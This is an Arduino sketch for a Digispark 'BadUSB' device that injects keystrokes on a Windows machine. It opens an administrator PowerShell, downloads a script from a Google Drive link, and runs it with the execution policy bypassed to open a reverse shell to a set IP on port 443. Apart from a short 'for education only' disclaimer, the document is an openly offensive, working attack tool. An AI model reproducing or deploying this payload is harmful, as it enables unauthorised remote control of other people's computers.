#include "DigiKeyboard.h"
#define KEY_LEFT_ARROW 0xd8
// powershell reverse shell https://drive.google.com/uc?export=download&id=yourdownloadhere
// written by jordon lovik for research purposes only. do not use or distribute this code for anything but education. i am no liable for any harm this script may do to you or anyone elses computer.
void setup() {
// runspeed use numbers between 50 – 2000
int runspeed = 500;
//define led
pinMode(0, OUTPUT); //led on model b
pinMode(1, OUTPUT); //led on model a
DigiKeyboard.delay(3*runspeed);
//turn light on
digitalWrite(0, HIGH);
digitalWrite(1, HIGH);
DigiKeyboard.sendKeyStroke(0,0);
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
DigiKeyboard.delay(1*runspeed);
//start powershell as administrator – enables you to bypass exections policy later
DigiKeyboard.println("powershell start-process powershell.exe -verb runas");
DigiKeyboard.delay(1*runspeed);
DigiKeyboard.sendKeyStroke(0,0);
DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW);
DigiKeyboard.delay(3*runspeed);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
//define payload download location (make sure this is a direct download link)
DigiKeyboard.delay(3*runspeed);
DigiKeyboard.println("$url = \"https://drive.google.com/uc?export=download&id=13dltw-ftkkfpryac2dzqnm7jurzzqhqs\"");
DigiKeyboard.update();
DigiKeyboard.delay(1*runspeed);
//grabs user name based on logged on user and stores it in $user
DigiKeyboard.println("$user = [environment]::username");
DigiKeyboard.update();
DigiKeyboard.delay(1*runspeed);
//write to conditional OUTPUT path using the desktop for debugging
DigiKeyboard.println("$output = \"C:\\Users\\$user\\Desktop\\payload1.ps1\"");
DigiKeyboard.update();
DigiKeyboard.delay(1*runspeed);
//download the payload from the specified url
DigiKeyboard.println("Invoke-WebRequest -Uri $url -OutFile $output");
DigiKeyboard.update();
DigiKeyboard.delay(3*runspeed);
//-windowstyle hidden
DigiKeyboard.println("powershell.exe -executionpolicy bypass \"c:\\users\\$user\\desktop\\payload1.ps1 -dest 172.16.31.84 -port 443\""); //ip
}
void loop() {
//blink lights when script completes
digitalWrite(0, HIGH);
digitalWrite(1, HIGH);
delay(50);
digitalWrite(0, LOW);
digitalWrite(1, LOW);
delay(50);
digitalWrite(0, HIGH);
digitalWrite(1, HIGH);
delay(20);
digitalWrite(0, HIGH);
digitalWrite(1, HIGH);
delay(20);
}
